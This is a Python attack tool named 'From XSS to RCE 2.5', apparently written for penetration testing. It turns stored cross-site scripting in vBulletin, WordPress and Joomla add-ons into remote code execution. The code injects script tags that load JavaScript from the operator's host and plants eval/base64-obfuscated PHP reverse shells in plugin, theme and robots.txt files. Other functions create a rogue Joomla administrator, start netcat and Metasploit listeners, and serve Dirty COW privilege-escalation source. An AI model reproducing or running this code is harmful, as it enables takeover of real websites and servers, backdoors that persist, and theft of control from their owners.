#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Version: 2.5.1
# Date: 13/Nov/16
# Author: Hans-Michael Varbaek
# Company: Sense of Security
# Credits: MaXe / InterN0T
#
# Requirements:
# - Gnome (gnome-terminal)
# - Bash
# - Msfconsole
# - Netcat (nc)
# - cURL (curl) [NEW]
# - PyGame (apt-get install python-pygame) [NEW]
# 
# Written for:
# - Python 2.7.11
#
# Tested on:
# - Kali Linux VM 2016.1
# 
# Tested against:
# - Chrome (14 Nov 2015) - This should still work.
# - FireFox (04 Nov 2016)
#
# Changelog:
# - WordPress Theme and Plugin injection are not using a hardcoded hostname anymore. (TARGETWEBSITE is now properly replaced)
# - Removed deprecated code for WordPress Theme and Plugin injection, so that the user is not asked twice to provide hostname to exploit.
# - Added dirtycow 32-bit and 64-bit source code files to the web servers. https://www.exploit-db.com/exploits/40616/ Note: This seems to cause kernel panic after the user quits the shell.
# - Removed --title from gnome-terminal commands as this option is no longer supported.
# - Notifications:
#   -- Added notification to the console / web server log.
#   -- Added a popup terminal notification with some ANSI text when the JavaScript is executed and "JS Shell Notify" is triggered.
#   -- Added a voice notification when the Reverse PHP Shell (Notify) option is executed on the remote server. Shell attempts to wget back to this host to the PHP Shell Notify web handler.
# - Automation:
#   -- vBulletin and WordPress shells are now automatically activated when the JavaScript is triggered.
# - New attack vectors:
#   -- Joomla "SecurityCheck" Addon - https://www.exploit-db.com/exploits/39879/ - EDB ID: 39879
# ============================================================================================ #

# Standard libraries
import sys
import os
import time 

# For payload preparation
import re
import base64

# For exploits and our HTTP server
import urllib # Needed for Joomla URL encoding [NEW]
import random
import httplib
import socket
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# Import pygame audio library
import pygame # [NEW]

# Required constants
menu_actions = {}

# ====================== #
#   DEFINED CLASSES
# ====================== # 

# ANSI font color class
class fontcolors:
  RED = '\033[91m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  BLUE = '\033[94m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

# vBSEO web server class (LinkBack vulnerability specific)
class MyHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    try:
      if self.path.endswith("%s.php" % evil_php): 
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write('<html><head><title>%s</title>' % xss_title)
        self.wfile.write('</head><body><center><h1>vBSEO Stored Cross-site Scripting</h1><br /><br />') 
        self.wfile.write('<a href="%s" target="_blank">I found this awesome forum</a>' % target_link)
        self.wfile.write('</center></body></html>')
        return

      if self.path.endswith("%s.js" % evil_jsf): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(js_output) # Serve File
        return

      if self.path.endswith("js_shell_notify.txt"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('Hello?') 
        # NEW FEATURES BELOW
        # Terminal and Popup Terminal Notifications
        print fontcolors.YELLOW + fontcolors.BOLD+"[!] JavaScript payload was activated!"+fontcolors.ENDC
        os.system('gnome-terminal --hide-menubar -e "bash -c \' ./js_alert.sh; exec bash\'"') # ASCII ART 
        # Activate shell request for vBulletin
        os.system('curl "%s/misc.php?activateshell=true" -o /dev/null -stderr /dev/null &' % finaltarget) # If the Python script encounters an error, the response (i.e. error) will be in the JS output which breaks our payload.
        return

      if self.path.endswith("php_shell_notify.txt"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('Hello again?') 
        YouGotShell() # NEW FEATURE
        return

      if self.path.endswith("dcow32.c"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(dcow32_output) # Serve File
        return

      if self.path.endswith("dcow64.c"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(dcow64_output) # Serve File
        return

      if self.path.endswith(""): 
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write('<html><head><title>Empty</title></head><body><h1>Nothing to see here..</h1></body></html>')
        return
      
      return

    except IOError:
      self.send_error(404,'File Not Found: %s' % self.path)

# WordPress/generic (payload) web server class
class WordPressHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    try:
      if self.path.endswith("x.js"): # Static for now
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(js_output)
        return

      if self.path.endswith("js_shell_notify.txt"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('Hello?') 
        # NEW FEATURES BELOW
        # Terminal and Popup Terminal Notifications	
        print fontcolors.YELLOW + fontcolors.BOLD+"[!] JavaScript payload was activated!"+fontcolors.ENDC
        os.system('gnome-terminal --hide-menubar -e "bash -c \' ./js_alert.sh; exec bash\'"') # ASCII ART
        # Activate shell request for WordPress
        curlpath = "%s%sactivateshell=true" % (target_hostname, activation_file) # Moved the "?" character to the individual files due to Joomla needs to use "&"
        os.system('curl "%s" -o /dev/null -stderr /dev/null &' % curlpath) # If the Python script encounters an error, the response (i.e. error) will be in the JS output which breaks our payload.
        return

      if self.path.endswith("php_shell_notify.txt"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('Hello again?') 
        YouGotShell() # NEW FEATURE
        return

      if self.path.endswith("dcow32.c"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(dcow32_output) # Serve File
        return

      if self.path.endswith("dcow64.c"): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(dcow64_output) # Serve File
        return

      # To be added in a future version of XSSER
      #if self.path.endswith("joomla_hello_shell.zip"): 
      #  self.send_response(200)
      #  self.send_header('Content-type', 'text/plain')
      #  self.end_headers()
      #  self.wfile.write(joomla_hello_shell) 
      #  return

      if self.path.endswith(""):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write('<html><head><title>Empty</title></head><body><h1>Nothing to see here..</h1></body></html>')
        return
      
      return

    except IOError:
      self.send_error(404,'File Not Found: %s' % self.path)

# Dirty COW File Handling - Quick solution
global dcow32_output
global dcow64_output
dcow32_file = open("Exploits/dirtycow32.c")
dcow64_file = open("Exploits/dirtycow64.c")
dcow32_output = dcow32_file.read()
dcow64_output = dcow64_file.read()

# To be added in a future version of XSSER
# Joomla Shell File Handling
#global joomla_hello_shell
#joomla_hello_shell_file = open("Payloads/php/hello-world-fixed.zip")
#joomla_hello_shell = joomla_hello_shell_file.read()

# Handle funny audio clip
# PyGame was generally the best option, as LibVLC experienced clipping issues.
def YouGotShell():
  pygame.mixer.pre_init(48000, -16, 2, 4096) # Change from 48000 to 44100 for lower pitch
  pygame.init()
  pygame.mixer.init()
  pygame.mixer.music.load('Audio/rapshell1.mp3')
  pygame.mixer.music.play(1)
  return

# ====================== #
#     MENU FUNCTIONS
# ====================== #
 
# Main menu
def main_menu():
  os.system('clear')
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  FROM XSS TO RCE 2.5 ││ Main Menu ││  ││  │"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"  
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Choose which exploit to use: (OSVDB-ID)" + fontcolors.ENDC
  print " ╔════════════════════════════════════════════════╗"
  print " ║ [1] vBulletin - vBSEO XSS (70854)              ║"
  print " ║ [2] WordPress - Better WP Security XSS (95884) ║"
  print " ║ [3] Joomla    - Security Check (EDB-ID 39879)  ║"
  print " ║                                                ║"
  print " ║ [?] Drupal (To be implemented)                 ║"
  print " ╚════════════════════════════════════════════════╝"
  print fontcolors.RED + "\n q. Quit\n" + fontcolors.ENDC
  choose_menu(exec_menu, 0, 0)
  return

# vBulletin menu
def menu1():
  global exploit_selection
  exploit_selection="vBSEO"
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  FROM XSS TO RCE 2.5 ││ vBulletin ││  ││  │"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Choose which payload to use:" + fontcolors.ENDC
  print " ╔════════════════════════════════════════════════╗"
  print " ║ [1] New Plugin (misc.php hook)                 ║"
  print " ║                                                ║"
  print " ║                                                ║"
  print " ║                                                ║"
  print " ║ [9] Back                                       ║"
  print " ╚════════════════════════════════════════════════╝"
  print fontcolors.RED + "\n q. Quit\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, vbulletin_menu, 1)
  return

# WordPress menu
def menu2():
  global exploit_selection
  exploit_selection="BetterWPSecurity"
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  FROM XSS TO RCE 2.5 ││ WordPress ││  ││  │"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Choose which payload to use:" + fontcolors.ENDC
  print " ╔════════════════════════════════════════════════╗"
  print " ║ [1] WPSEO (robots.txt & .htaccess)             ║"
  print " ║ [2] WordPress Current Theme (footer.php)       ║"
  print " ║ [3] WordPress Hello Plugin (hello.php)         ║"
  print " ║                                                ║"
  print " ║ [9] Back                                       ║"
  print " ╚════════════════════════════════════════════════╝"
  print fontcolors.RED + "\n q. Quit\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, wordpress_menu, 2)
  return

# Joomla menu
def menu3():
  global exploit_selection
  exploit_selection="SecurityCheck" # NEW OPTION
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  FROM XSS TO RCE 2.5 ││ WordPress ││  ││  │"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Choose which payload to use:" + fontcolors.ENDC
  print " ╔════════════════════════════════════════════════╗"
  print " ║ [1] Add New Super User (Admin)                 ║"
  print " ║                                                ║"
  print " ║ Note: Select \"no payload\" on next page.        ║"
  print " ║                                                ║"
  print " ║ [9] Back                                       ║"
  print " ╚════════════════════════════════════════════════╝"
  print fontcolors.RED + "\n q. Quit\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, joomla_menu, 3)
  return

# Payload menu
def payload_menu_func(origin):
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  FROM XSS TO RCE 2.5 ││ Payloads  ││  ││  │"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Choose which shell to use:" + fontcolors.ENDC
  print " ╔════════════════════════════════════════════════╗"
  print " ║ [1] Reverse Meterpreter (PHP)                  ║"
  print " ║ [2] PentestMonkey Reverse PHP Shell            ║"
  print " ║ [3] PentestMonkey Reverse PHP Shell (Notify)   ║"
  print " ║                                                ║"
  print " ║ [5] No payload (manual upload)                 ║"
  print " ║ [9] Back                                       ║"
  print " ╚════════════════════════════════════════════════╝"
  print fontcolors.RED + "\n q. Quit\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, payload_menu, origin)
  return

def preparePayloadBanner():
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  FROM XSS TO RCE 2.5 ││ Config    ││  ││  │"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC

# Handle menu selection
def choose_menu(MenuType, cms_actions, origin):
  try:
    choice = raw_input(fontcolors.BOLD + fontcolors.BLUE+ " >>  " + fontcolors.ENDC)
  except KeyboardInterrupt:
    print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
    sys.exit()
  MenuType(choice, cms_actions, origin)

# Execute main menu option
def exec_menu(choice, cms_actions, origin):
  os.system('clear')
  ch = choice.lower()
  if ch == '':
    menu_actions['main_menu']()
  else:
    try:
      menu_actions[ch]()
    except KeyError:
      print " [!] Invalid selection, please try again.\n"
      menu_actions['main_menu']()
  return

# Execute sub menu option
def exec_sub_menu(choice, sub_actions, origin):
  os.system('clear')
  ch = choice.lower()
  if ch == '':
    menu_actions[origin]() # Go back to the sub-menu where we came from, not the main menu
  else:
    try:
      sub_actions[ch]() # Go into the next level sub-menu to choose e.g. payload type
    except KeyError:
      print " [!] Invalid selection, please try again.\n"
      menu_actions[origin]() # Go back to the sub-menu where we came from, not the main menu
  return

# Back to main menu
def back():
  menu_actions['main_menu']()

# Exit program
def exit():
  sys.exit()


# vBulletin menu
def vbmenu1():
  global payload_selection
  payload_selection="vb_misc"
  payload_menu_func(1)
  # vBulletin New Plugin (misc.php hook)


# WordPress menu
def wpmenu1():
  global payload_selection
  payload_selection="wpseo"
  payload_menu_func(2)
  # WordPress WPSEO (robots.txt & .htaccess)

def wpmenu2():
  global payload_selection
  payload_selection="wp_footer_theme"
  payload_menu_func(2)
  # WordPress Current Theme (footer.php)
    
def wpmenu3():
  global payload_selection
  payload_selection="wp_hello_plugin"
  payload_menu_func(2)
  # WordPress Hello Plugin (hello.php)

  
# Joomla menu
def jmenu1():
  global payload_selection
  payload_selection="add_new_admin"
  payload_menu_func(3)
  # Joomla Add New Admin


# =============================== #
# EXPLOITS AND PAYLOADS FUNCTIONS
# =============================== # 

# Payload menus
def meterpreter():
  global php_selection
  php_selection="meterpreter"
  php_output = preparePayload(php_selection) # Stores our configured PHP shell
  global js_output
  js_output = updateJavaScriptPayload(payload_selection,php_output) # Stores our final JavaScript payload
  writeRCfile() # Write an RC file for Metasploit's Msfconsole
  rcfile = '/tmp/xsser.rc'
  os.system('gnome-terminal --hide-menubar -e "bash -c \'echo [*] Executing metasploit; msfconsole -r '+rcfile+'; exec bash\'"')
  handleExploit(exploit_selection,js_output,lhost)

def pentestmonkey():
  global php_selection
  php_selection="pentestmonkey"
  php_output = preparePayload(php_selection) # Stores our configured PHP shell
  global js_output
  js_output = updateJavaScriptPayload(payload_selection,php_output) # Stores our final JavaScript payload
  os.system('gnome-terminal --hide-menubar -e "bash -c \'echo [*] Executing netcat; nc -lnvp '+lport+' -s '+lhost+'; exec bash\'"')
  handleExploit(exploit_selection,js_output,lhost)

def pentestmonkey_notify():
  global php_selection
  php_selection="pentestmonkey_notify"
  php_output = preparePayload(php_selection) # Stores our configured PHP shell
  global js_output
  js_output = updateJavaScriptPayload(payload_selection,php_output) # Stores our final JavaScript payload
  os.system('gnome-terminal --hide-menubar -e "bash -c \'echo [*] Executing netcat; nc -lnvp '+lport+' -s '+lhost+'; exec bash\'"')
  handleExploit(exploit_selection,js_output,lhost)

def payload_not_specified():
  global php_selection
  php_selection="payload_not_specified"
  php_output = preparePayload(php_selection) # Stores our configured PHP shell
  global js_output
  js_output = updateJavaScriptPayload(payload_selection,php_output) # Stores our final JavaScript payload
  handleExploit(exploit_selection,js_output,lhost)	


def writeRCfile():
  input = "use multi/handler\n\
set payload php/meterpreter/reverse_tcp\n\
set LHOST "+lhost+"\n\
set LPORT "+lport+"\n\
run -j"
  file = open('/tmp/xsser.rc','w')
  file.write(input)
  file.close()

# Preferably, this function needs to load/import the selected exploit module and execute it in the near future.
def handleExploit(exploit,js_payload,localhost):
  if exploit == 'vBSEO':
   try:
    global evil_php
    global evil_jsf
    global xss_title
    global target_link
    global finaltarget
    global http_port
    global activation_file
    http_port = 80 # Port to listen on. Does not really need to be dynamic at the moment.
    evil_php = "%s%s%s" % (random.randrange(0, 253),random.randrange(1, 256),random.randrange(0, 255))
    evil_jsf = "%s%s%s" % (random.randrange(1, 257),random.randrange(0, 254),random.randrange(1, 258))
    xss_title = 'The Friendly Website" size="70" dir="ltr" tabindex="1"><script src="http://%s:%s/%s.js"></script><br ' % (localhost,http_port,evil_jsf)
    print " [?] You need to enter a URL to exploit."
    print " [?] Example: http://forum-site.tld/1234-a-nice-thread.html\n"
    target_link = raw_input(fontcolors.BOLD+fontcolors.BLUE+"  >> "+fontcolors.ENDC)
    striptarget = re.compile('(http://|https://)') 
    newtarget = striptarget.sub('', target_link) 
    striptarget2 = re.compile('/.*')
    finaltarget = striptarget2.sub('', newtarget)
    #print finaltarget 
    # DEBUG: Should return e.g. mycompany.com.au
    try:
      server = HTTPServer((localhost, http_port), MyHandler)
      print fontcolors.BLUE+fontcolors.BOLD+'\n\t╔═════════════════════════════╗'
      print '\t║ Started Payload HTTP Server ║'
      print '\t╚═════════════════════════════╝'
      print fontcolors.ENDC
      print ' [*] Serving attack file from: http://%s:%s/%s.php ' % (localhost,http_port,evil_php)
      print ' [*] Serving payload file from: http://%s:%s/%s.js ' % (localhost,http_port,evil_jsf)
      print ' [!] Browse to: "'+fontcolors.BLUE+fontcolors.BOLD+'misc.php?activateshell=true'+fontcolors.ENDC+'", to activate the payload.'
      print ' [+] DCOW (SUID) 32-bit src is available at: http://%s:%s/dcow32.c' % (localhost,http_port)
      print ' [+] DCOW (SUID) 64-bit src is available at: http://%s:%s/dcow64.c' % (localhost,http_port)
      print ' [?] Press CTRL+C to stop the server and exit the script. \n'
      print '-------------- HTTP Requests Below --------------'
      server.serve_forever() 
    except KeyboardInterrupt: # Get all the unexpected keyboard interrupts
      print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
      server.socket.close() 
      sys.exit(1)
   except KeyboardInterrupt: # Get all the unexpected keyboard interrupts
    print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
    sys.exit(1)
  elif exploit == 'BetterWPSecurity':
   try:
    global activation_file
    if payload_selection == 'wp_hello_plugin':
      activation_file = "/wp-content/plugins/hello.php?"
    elif payload_selection == 'wp_footer_theme':
      activation_file = "/?"
    elif payload_selection == 'wpseo':
      activation_file = "/robots.txt?"
    else:
      activation_file = "Unknown Payload - Restart Script"
      sys.exit()
    unencoded_payload = '<script src="http://'+localhost+'/x.js"></script>'
    base64_payload = '"><script>document.write(atob(/'+base64.b64encode(unencoded_payload)+'/.source))</script>'
    fourohfour_url = "%s%s%s.php?" % (random.randrange(0, 235),random.randrange(1, 214),random.randrange(0, 135))
    try:
      conn = httplib.HTTPConnection(target_hostname, 80)
      conn.request("GET", "/"+fourohfour_url+base64_payload) 
      resp = conn.getresponse()
      output = resp.read()
      if resp.status == 404: 
        print "\n [*] 404 received, checking that WordPress handled the error."
        if re.search("(That page can)", output):
          print " [*] It looks like WordPress handled the injection."
          http_port = 80 # Port to listen on. Does not really need to be dynamic at the moment.
          try:
            server = HTTPServer((localhost, http_port), WordPressHandler)
            print fontcolors.BLUE+fontcolors.BOLD+'\n\t╔═════════════════════════════╗'
            print '\t║ Started Payload HTTP Server ║'
            print '\t╚═════════════════════════════╝'
            print fontcolors.ENDC
            print ' [*] Serving payload file from: http://%s:%s/x.js ' % (localhost,http_port)
            print ' [!] Browse to: "'+fontcolors.BLUE+fontcolors.BOLD+activation_file+'activateshell=true'+fontcolors.ENDC+'", to activate the payload.'
            print ' [+] DCOW (SUID) 32-bit src is available at: http://%s:%s/dcow32.c' % (localhost,http_port)
            print ' [+] DCOW (SUID) 64-bit src is available at: http://%s:%s/dcow64.c' % (localhost,http_port)
            print ' [?] Press CTRL+C to stop the server and exit the script. \n'
            print '-------------- HTTP Requests Below --------------'
            server.serve_forever()
          except KeyboardInterrupt:
            server.socket.close()
            sys.exit()
        else:
          print " [!] The web server handled the 404 error page, meaning the injection did not occur within Better WP Security."
    except Exception as e:
      print " [!] An error occurred: %s\n[!] Shutting down." % e
      sys.exit(1)
   except KeyboardInterrupt:
    print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
    sys.exit(1)
  elif exploit == 'SecurityCheck':
   try:
    if payload_selection == 'add_new_admin':
      activation_file = "NOT_APPLICABLE"
    else:
      activation_file = "Unknown Payload - Restart Script"
      sys.exit()
    unencoded_payload = '<script src="http://'+localhost+'/x.js"></script>' # <script src="http://192.168.220.130/x.js"></script>
    urlencoded_payload = urllib.quote_plus(unencoded_payload)
    exploit_url = "index.php?option="
    try:
      conn = httplib.HTTPConnection(target_hostname, 80)
      conn.request("GET", "/"+exploit_url+urlencoded_payload) 
      resp = conn.getresponse()
      output = resp.read()
      if resp.status == 400: 
        print "\n [*] 400 received, checking that Joomla SecurityCheck handled the error."
        if re.search("(It has been detected a sequence that could mean a hacker attack)", output):
          print " [*] It looks like Joomla SecurityCheck handled the injection."
          http_port = 80 # Port to listen on. Does not really need to be dynamic at the moment.
          try:
            server = HTTPServer((localhost, http_port), WordPressHandler)
            print fontcolors.BLUE+fontcolors.BOLD+'\n\t╔═════════════════════════════╗'
            print '\t║ Started Payload HTTP Server ║'
            print '\t╚═════════════════════════════╝'
            print fontcolors.ENDC
            print ' [*] Serving payload file from: http://%s:%s/x.js ' % (localhost,http_port)
            #print ' [!] Browse to: "'+fontcolors.BLUE+fontcolors.BOLD+activation_file+'activateshell=true'+fontcolors.ENDC+'", to activate the payload.'
            print ' [!] Your username is: '+fontcolors.BLUE+fontcolors.BOLD+joomla_username+fontcolors.ENDC+' '
            print ' [!] Your password is: '+fontcolors.BLUE+fontcolors.BOLD+joomla_password+fontcolors.ENDC+' '
            print ' [+] DCOW (SUID) 32-bit src is available at: http://%s:%s/dcow32.c' % (localhost,http_port)
            print ' [+] DCOW (SUID) 64-bit src is available at: http://%s:%s/dcow64.c' % (localhost,http_port)
            print ' [?] Press CTRL+C to stop the server and exit the script. \n'
            print '-------------- HTTP Requests Below --------------'
            server.serve_forever()
          except KeyboardInterrupt:
            server.socket.close()
            sys.exit()
        else:
          print " [!] The web server handled the 400 error page, meaning the injection did not occur within Joomla SecurityCheck."
    except Exception as e:
      print " [!] An error occurred: %s\n[!] Shutting down." % e
      sys.exit(1)
   except KeyboardInterrupt:
    print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
    sys.exit(1)
  else:
    print " [!] Invalid exploit, quitting."
    sys.exit()

# Update JavaScript payload
def updateJavaScriptPayload(payload_type,php_input):
 global target_hostname # Version 2.5 Messy Fix
 target_hostname = ''
 try:
  if payload_type == 'vb_misc':
    payload_file = open("Payloads/javascript/vbulletin_legacy.js") # Misc_Start vBulletin Hook (misc.php)
  elif payload_type == 'wpseo':
    payload_file = open("Payloads/javascript/wordpress_legacy.js") # WPSEO (robots.txt and .htaccess)
    # Version 2.5 messy fix for callback in JS files for WordPress - Clean up later
    print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
    target_hostname = raw_input(" [?] Hostname: ")
  elif payload_type == 'wp_footer_theme':
    payload_file = open("Payloads/javascript/wordpress_theme.js") # WordPress Core Theme (footer.php)
    # Version 2.5 messy fix for TARGETWEBSITE in JS files
    print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
    target_hostname = raw_input(" [?] Hostname: ")
  elif payload_type == 'wp_hello_plugin':
    payload_file = open("Payloads/javascript/wordpress_plugin.js") # WordPress Core Plugin (hello.php)
    # Version 2.5 messy fix for TARGETWEBSITE in JS files
    print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
    target_hostname = raw_input(" [?] Hostname: ")
    # NEW JOOMLA EXPLOIT BELOW
  elif payload_type == 'add_new_admin':
    print " [?] Enter the target hostname/FQDN\n [?] e.g. www.target.com.au"
    target_hostname = raw_input(" [?] Hostname: ")
    global joomla_username
    global joomla_password
    payload_file = open("Payloads/javascript/joomla_admin.js") # Joomla Add New Super User (admin)
    prompt1 = raw_input(" [?] Enter shown name: ") 
    prompt2 = raw_input(" [?] Enter a username: ")    
    prompt3 = raw_input(" [?] Enter a password: ")    
    prompt4 = raw_input(" [?] Enter an email  : ")  
    joomla_username = prompt2
    joomla_password = prompt3
    prompt1_reg = re.compile('(VAR_SHOWN_NAME)')
    prompt2_reg = re.compile('(VAR_USER_NAME)')
    prompt3a_reg = re.compile('(VAR_PASSWORD_1)')
    prompt3b_reg = re.compile('(VAR_PASSWORD_2)')
    prompt4_reg = re.compile('(VAR_EMAIL)')
    stage1  = prompt1_reg.sub(prompt1, payload_file.read())
    stage2  = prompt2_reg.sub(prompt2, stage1)
    stage3a = prompt3a_reg.sub(prompt3, stage2)
    stage3b = prompt3b_reg.sub(prompt3, stage3a)
    stage4  = prompt4_reg.sub(prompt4, stage3b)
    callbackhost_reg = re.compile('(CALLBACKHOST)')
    callbackport_reg = re.compile('(CALLBACKPORT)')
    stage5 = callbackhost_reg.sub(lhost, stage4)
    stage6 = callbackport_reg.sub("80", stage5)
    return stage6 # Need to return early for this exploit/payload
  else:
    print " [!] Invalid payload, quitting."
    sys.exit()
  http_port = "80" # Port to listen on. Does not really need to be dynamic at the moment.
  payload_replace = re.compile('(PHP_PAYLOAD)')
  payload_stage1 = payload_replace.sub(php_input, payload_file.read())
  hostname_replace = re.compile('(TARGETWEBSITE)')
  payload_stage2 = hostname_replace.sub(target_hostname, payload_stage1) 
  callbackhost_replace = re.compile('(CALLBACKHOST)')
  payload_stage3 = callbackhost_replace.sub(lhost, payload_stage2)
  callbackport_replace = re.compile('(CALLBACKPORT)')
  payload_stage4 = callbackport_replace.sub(http_port, payload_stage3)
  return payload_stage4
 except KeyboardInterrupt:
   print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
   sys.exit()

# Based on the vbseo.py preparePayload function
# Optimise in a future version
def preparePayload(option):
 try:
  global lhost
  global lport
  if option == 'meterpreter':
    preparePayloadBanner()
    lhost = raw_input(" [?] Enter a listening IP: ")
    lport = raw_input(" [?] Enter a listening port: ")
    payload_shell = open('Shells/meterpreter/meterpreter.php')
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(lhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(lport,add_host)
    stripspace = re.compile('[\t\n\r]')
    filepart2 = stripspace.sub('', add_port)
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));"
    return payload_insert
  elif option == 'pentestmonkey':
    preparePayloadBanner()
    lhost = raw_input(" [?] Enter a listening IP: ")
    lport = raw_input(" [?] Enter a listening port: ")
    payload_shell = open('Shells/php-reverse-shell-1.0/php-reverse-shell.php')
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(lhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(lport,add_host)
    stripcomments = re.compile('//.*?\n|/\*.*?\*/')
    filepart1 = stripcomments.sub('', add_port)
    stripspace = re.compile('[\t\n]')
    filepart2 = stripspace.sub('', filepart1)
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));"
    return payload_insert
  elif option == 'pentestmonkey_notify':
    preparePayloadBanner()
    lhost = raw_input(" [?] Enter a listening IP: ")
    lport = raw_input(" [?] Enter a listening port: ")
    payload_shell = open('Shells/php-reverse-shell-1.0/php-reverse-shell-notify.php')
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(lhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(lport,add_host)
    stripcomments = re.compile('//.*?\n|/\*.*?\*/')
    filepart1 = stripcomments.sub('', add_port)
    stripspace = re.compile('[\t\n]')
    filepart2 = stripspace.sub('', filepart1)
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));"
    return payload_insert
  elif option == 'payload_not_specified':
    preparePayloadBanner()
    payload_insert = " "
    lport = 4321
    lhost = raw_input(" [?] Enter a listening IP: ")
    return payload_insert
  else:
    print " [!] Invalid payload, quitting."
    sys.exit()
 except KeyboardInterrupt:
   print fontcolors.YELLOW + "\n [!] CTRL+C detected, shutting down." + fontcolors.ENDC
   sys.exit()
  


# ====================== #
#    MENU DEFINITIONS
# ====================== #
 
# Menu definition
menu_actions = {
  'main_menu': main_menu,
  '1': menu1,
  '2': menu2,
  '3': menu3,
  '9': back,
  'q': exit,
}

vbulletin_menu = {
  '1': vbmenu1,
  '9': back,
  'q': exit,
}

wordpress_menu = {
  '1': wpmenu1,
  '2': wpmenu2,
  '3': wpmenu3,
  '9': back,
  'q': exit,
}

joomla_menu = {
  '1': jmenu1,
  '9': back,
  'q': exit,
}

payload_menu = {
  '1': meterpreter,
  '2': pentestmonkey,
  '3': pentestmonkey_notify,
  '5': payload_not_specified,
  '9': back,
  'q': exit,
}
 
# ====================== #
#      MAIN PROGRAM
# ====================== #
 
# Main Program
if __name__ == "__main__":
  # Launch our main menu
  main_menu()
